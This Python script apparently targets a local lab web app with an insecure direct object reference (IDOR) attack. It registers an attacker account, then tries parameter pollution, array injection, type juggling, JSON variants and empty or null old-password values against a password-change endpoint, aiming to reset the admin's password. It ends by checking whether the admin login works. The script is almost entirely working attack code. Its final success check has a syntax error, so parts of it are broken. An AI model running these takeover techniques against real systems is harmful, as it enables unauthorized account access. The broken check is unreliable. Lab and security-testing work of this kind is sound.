import requests
import json

base_url = "http://127.0.0.1:32973"

session = requests.Session()

print("=" * 60)
print("STEP 1: REGISTER NEW ATTACKER ACCOUNT")
print("=" * 60)

register_data = {
    "username": "testattacker",
    "email": "testattacker@test.com",
    "password": "hacker123!",
    "confirmPassword": "hacker123!"
}

reg_resp = session.post(f"{base_url}/api/register.php", data=register_data)
print(f"Register Status: {reg_resp.status_code}")
print(f"Register Response: {reg_resp.text}")

# Now login
print("\n" + "=" * 60)
print("STEP 2: LOGGING IN AS ATTACKER")
print("=" * 60)

login_data = {
    "username": "testattacker",
    "password": "hacker123!"
}

login_resp = session.post(f"{base_url}/api/login.php", data=login_data)
print(f"Login Status: {login_resp.status_code}")
print(f"Login Response: {login_resp.text}")
print(f"PHPSESSID Cookie: {session.cookies.get('PHPSESSID')}")

if login_resp.status_code == 200:
    print("[+] HTTP 200 received")

print("\n" + "=" * 60)
print("STEP 3: TESTING IDOR BYPASS TECHNIQUES")
print("=" * 60)

# Technique 1: Parameter pollution
print("\n[TECHNIQUE 1] Parameter Pollution - userId=7 then userId=17")
print("-" * 60)

pollution_payload = "userId=7&oldPassword=hacker123!&newPassword=Hacked123!&confirmPassword=Hacked123!&userId=17"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

pollution_resp = session.post(
    f"{base_url}/api/change_password.php",
    data=pollution_payload,
    headers=headers
)
print(f"Request Body: {pollution_payload}")
print(f"Response: {pollution_resp.text}")
print(f"HTTP Status: {pollution_resp.status_code}")

# Technique 1b: Parameter pollution with different order
print("\n[TECHNIQUE 1b] Parameter Pollution - Reverse order")
pollution_payload2 = "userId=17&oldPassword=hacker123!&newPassword=Hacked123!&confirmPassword=Hacked123!&userId=7"
pollution_resp2 = session.post(
    f"{base_url}/api/change_password.php",
    data=pollution_payload2,
    headers=headers
)
print(f"Request Body: {pollution_payload2}")
print(f"Response: {pollution_resp2.text}")

# Technique 2: Array injection on userId
print("\n[TECHNIQUE 2] Array Injection on userId")
print("-" * 60)

array_data = {
    "userId[]": ["7", "17"],
    "oldPassword": "hacker123!",
    "newPassword": "Hacked123!",
    "confirmPassword": "Hacked123!"
}

array_resp = session.post(f"{base_url}/api/change_password.php", data=array_data)
print(f"Request: userId[]=7&userId[]=17&oldPassword=hacker123!&newPassword=Hacked123!&confirmPassword=Hacked123!")
print(f"Response: {array_resp.text}")

# Technique 3: Type juggling (String vs Int)
print("\n[TECHNIQUE 3] Type Juggling")
print("-" * 60)

juggle_data = {
    "userId": "7",  # String version
    "oldPassword": "hacker123!",
    "newPassword": "Hacked123!",
    "confirmPassword": "Hacked123!"
}
juggle_resp = session.post(f"{base_url}/api/change_password.php", data=juggle_data)
print(f"Request: userId=\"7\" (string)")
print(f"Response: {juggle_resp.text}")

# Technique 4: JSON payload variants
print("\n[TECHNIQUE 4] JSON Content-Type payloads")
print("-" * 60)

json_headers = {"Content-Type": "application/json"}
json_variants = [
    {"userId": 7, "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": "7", "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": [7, 17], "oldPassword": "hacker123!", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
]

for i, payload in enumerate(json_variants, 1):
    resp = session.post(f"{base_url}/api/change_password.php", json=payload, headers=json_headers)
    print(f"\nJSON Variant {i}: {payload}")
    print(f"Response: {resp.text}")

# Technique 5: Empty/null oldPassword bypasses
print("\n[TECHNIQUE 5] Empty/Null oldPassword bypass attempts")
print("-" * 60)

null_tests = [
    {"userId": 7, "oldPassword": "", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": 7, "oldPassword": "\x00", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
    {"userId": 7, "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},  # No oldPassword
    {"userId": 7, "oldPassword[]": "", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"},
]

for i, test in enumerate(null_tests, 1):
    resp = session.post(f"{base_url}/api/change_password.php", data=test)
    print(f"\nNull Test {i}: {test}")
    print(f"Response: {resp.text}")

# Technique 6: Test baseline - change own password
print("\n[TECHNIQUE 6] Baseline - changing our own password")
print("-" * 60)

own_data = {
    "oldPassword": "hacker123!",
    "newPassword": "Hacked123!",
    "confirmPassword": "Hacked123!"
}
own_resp = session.post(f"{base_url}/api/change_password.php", data=own_data)
print(f"Request: Change own password without userId")
print(f"Response: {own_resp.text}")

# Final test - re-login with new password to see if admin password was changed
print("\n" + "=" * 60)
print("STEP 4: VERIFICATION - Try login as admin with new password")
print("=" * 60)

admin_test = requests.Session()
admin_login = admin_test.post(
    f"{base_url}/api/login.php",
    data={"username": "admin", "password": "Hacked123!"}
)
print(f"Admin login with 'Hacked123!': {admin_login.text}")
print(f"Status: {admin_login.status_code}")
if admin_login.status_code == 200:
    if "success":true in admin_login.text or "welcome" in admin_login.text.lower():
        print("[!] SUCCESS: Admin password was changed!")
    else:
        print("[-] Admin password change failed")

